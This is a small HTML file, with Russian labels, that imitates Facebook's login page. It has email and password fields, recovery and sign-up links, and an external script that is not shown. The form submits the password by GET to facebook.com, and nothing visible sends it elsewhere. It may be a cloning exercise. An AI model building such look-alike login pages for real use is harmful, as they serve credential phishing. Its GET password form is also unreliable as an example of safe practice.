<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="login-container">
        <div class="login-box">
            <h1>Facebook</h1>
            <form action="https://www.facebook.com/login.php" method="GET">
                <div class="input-group">
                    <input type="text" name="email" placeholder="Email или телефон" required>
                </div>
                <div class="input-group">
                    <input type="password" name="pass" placeholder="Пароль" required>
                </div>
                <button type="submit" class="login_btn">Войти</button>
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
                    class="forgot-password">Забыли пароль?</a>
                <div class="divider"></div>
                <a href="https://www.facebook.com/r.php">
                    <button type="button" class="create-account-btn">Создать новый аккаунт</button></a>
            </form>
        </div>
    </div>
    <script src="./main.js"></script>
</body>

</html>
